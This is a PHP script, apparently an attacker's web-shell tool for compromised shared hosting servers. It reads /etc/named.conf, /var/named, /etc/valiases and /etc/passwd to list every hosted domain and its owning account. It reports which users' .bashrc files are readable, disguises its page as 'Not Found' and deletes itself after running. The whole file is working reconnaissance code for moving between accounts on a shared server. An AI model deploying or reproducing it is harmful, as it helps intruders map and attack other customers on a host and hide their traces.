<?php

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
 
echo '<html><head>
<meta content="text/html; charset=utf-8">
<meta name="keywords" content="Not Found" />
<meta name="description" content="Not Found" />
<meta name="author" content="Not Found" />
</head><body>';
 
echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> NOMER </th><th> DOMAIN </th><th> USER </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.bashrc';
$path = getcwd();
 
if (is_readable($dirz)) {
echo "<tr><td>".$count++."</td><td><a href=http://".$domain." target='_blank'>".$domain."</a></td><td>".$owner['name']."</td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<center><br><div class="result">Domain Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> NOMER </th><th> DOMAIN </th><th> USER </th><th> </th><th> .bashrc </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.bashrc';
$path = getcwd();
if (is_readable($dirz)) {
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                                }
            }
                        }
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<div class='result'><i><font color='#'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>/etc/named.conf</font> Not Accessible!</i></div>";
}
 
echo "<br>&#169; <font color='red'> ^_^ </font>";

echo '<style>body {background-color:#;color:#;}</style>
Hacker Sakit Hati<br>';

$result=unlink("domain-users.php");
if($result){
echo " File domain-users.php BERHASIL DI HAPUS</font></br>";
}else{
echo "Hati - Hati FIle gagal dihapus . . . ! ! !</br>";
}


?>
